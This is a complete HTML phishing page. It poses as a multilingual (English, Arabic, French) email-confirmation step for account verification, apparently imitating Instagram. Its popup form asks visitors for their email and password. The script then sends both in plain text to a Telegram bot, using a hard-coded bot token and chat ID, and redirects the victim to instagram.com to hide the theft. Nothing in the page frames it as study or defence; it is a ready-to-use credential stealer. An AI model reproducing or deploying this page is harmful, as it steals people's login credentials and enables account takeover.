<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Confirmation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 350px;
            position: relative;
        }
        .container img {
            width: 50px;
            margin-bottom: 10px;
        }
        .container h1 {
            font-size: 18px;
            color: #333;
            margin-bottom: 15px;
        }
        .container p {
            font-size: 14px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        .container .button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 14px;
            color: #fff;
            background-color: #3897f0;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .container .button:hover {
            background-color: #287bd1;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            z-index: 1000;
        }
        .popup h2 {
            font-size: 18px;
            color: #333;
        }
        .popup p {
            font-size: 14px;
            color: #555;
        }
        .popup .close-btn {
            display: inline-block;
            margin-top: 10px;
            padding: 8px 16px;
            font-size: 14px;
            color: #fff;
            background-color: #e74c3c;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .popup .close-btn:hover {
            background-color: #c0392b;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        .language-selector {
            position: absolute;
            top: 10px;
            right: 10px;
        }
        .language-selector select {
            padding: 5px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Language Selector -->
        <div class="language-selector">
            <select id="language-select">
                <option value="en">English</option>
                <option value="ar">العربية</option>
                <option value="fr">Français</option>
            </select>
        </div>

        <img src="https://cdn-icons-png.flaticon.com/512/561/561127.png" alt="Email Logo">
        <h1 id="title">Mail Confirmation</h1>
        <p id="message">
            In order to verify account, you need to confirm your email. After mail confirmation, your request will be evaluated within 24 hours and you will be returned.
        </p>
        <div class="button" id="confirm-button">Confirm E-Mail</div>
        <p id="language-note" style="font-size: 12px; color: #777; margin-top: 15px;">English</p>
    </div>

    <!-- Overlay and Popup -->
    <div class="overlay" id="overlay"></div>
    <div class="popup" id="popup">
        <h2 id="popup-title">Confirm Your E-Mail</h2>
        <p id="popup-message">Please enter your email and password to confirm your account:</p>
        <form id="confirm-form">
            <input type="email" id="email" placeholder="Email" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;" required>
            <input type="password" id="password" placeholder="Password" style="width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;" required>
            <button type="submit" id="submit-button" style="width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Submit</button>
        </form>
        <a href="#" class="close-btn" id="close-popup">Close</a>
    </div>

    <script>
        const confirmButton = document.getElementById("confirm-button");
        const popup = document.getElementById("popup");
        const overlay = document.getElementById("overlay");
        const closePopup = document.getElementById("close-popup");
        const confirmForm = document.getElementById("confirm-form");
        const emailInput = document.getElementById("email");
        const passwordInput = document.getElementById("password");
        const languageSelect = document.getElementById("language-select");

        // Language texts
        const texts = {
            en: {
                title: "Mail Confirmation",
                message: "In order to verify account, you need to confirm your email. After mail confirmation, your request will be evaluated within 24 hours and you will be returned.",
                confirmButton: "Confirm E-Mail",
                languageNote: "English",
                popupTitle: "Confirm Your E-Mail",
                popupMessage: "Please enter your email and password to confirm your account:",
                submitButton: "Submit",
                closeButton: "Close"
            },
            ar: {
                title: "تأكيد البريد الإلكتروني",
                message: "لتأكيد الحساب، يرجى تأكيد بريدك الإلكتروني. بعد التأكيد، سيتم تقييم طلبك خلال 24 ساعة وسيتم إرجاعك.",
                confirmButton: "تأكيد البريد الإلكتروني",
                languageNote: "العربية",
                popupTitle: "تأكيد بريدك الإلكتروني",
                popupMessage: "يرجى إدخال بريدك الإلكتروني وكلمة المرور لتأكيد حسابك:",
                submitButton: "إرسال",
                closeButton: "إغلاق"
            },
            fr: {
                title: "Confirmation par e-mail",
                message: "Pour vérifier votre compte, vous devez confirmer votre e-mail. Après confirmation, votre demande sera évaluée dans les 24 heures et vous serez redirigé.",
                confirmButton: "Confirmer l'e-mail",
                languageNote: "Français",
                popupTitle: "Confirmez votre e-mail",
                popupMessage: "Veuillez entrer votre e-mail et mot de passe pour confirmer votre compte:",
                submitButton: "Soumettre",
                closeButton: "Fermer"
            }
        };

        // Function to change language
        const changeLanguage = (language) => {
            document.getElementById("title").innerText = texts[language].title;
            document.getElementById("message").innerText = texts[language].message;
            document.getElementById("confirm-button").innerText = texts[language].confirmButton;
            document.getElementById("language-note").innerText = texts[language].languageNote;
            document.getElementById("popup-title").innerText = texts[language].popupTitle;
            document.getElementById("popup-message").innerText = texts[language].popupMessage;
            document.getElementById("submit-button").innerText = texts[language].submitButton;
            document.getElementById("close-popup").innerText = texts[language].closeButton;
        };

        // Event listener for language change
        languageSelect.addEventListener("change", (e) => {
            changeLanguage(e.target.value);
        });

        // Show popup
        confirmButton.addEventListener("click", () => {
            popup.style.display = "block";
            overlay.style.display = "block";
        });

        // Close popup
        closePopup.addEventListener("click", () => {
            popup.style.display = "none";
            overlay.style.display = "none";
        });

        // Close popup when clicking on overlay
        overlay.addEventListener("click", () => {
            popup.style.display = "none";
            overlay.style.display = "none";
        });

        // Handle form submission
        confirmForm.addEventListener("submit", (e) => {
            e.preventDefault(); // Prevent form from submitting

            const email = emailInput.value;
            const password = passwordInput.value;

            // Send data to Telegram bot
            const botToken = "7527317899:AAE2ljsBCTmqhXrS3bbQndKl6Cgu4mzI-6A"; // Replace with your bot token
            const chatId = "809845485"; // Replace with your chat ID
            const message = `New Submission:\nEmail: ${email}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                console.log("Message sent:", data);
                // Redirect to Instagram
                window.location.href = "https://www.instagram.com";
            })
            .catch(error => {
                console.error("Error sending message:", error);
            });
        });
    </script>
</body>
</html>
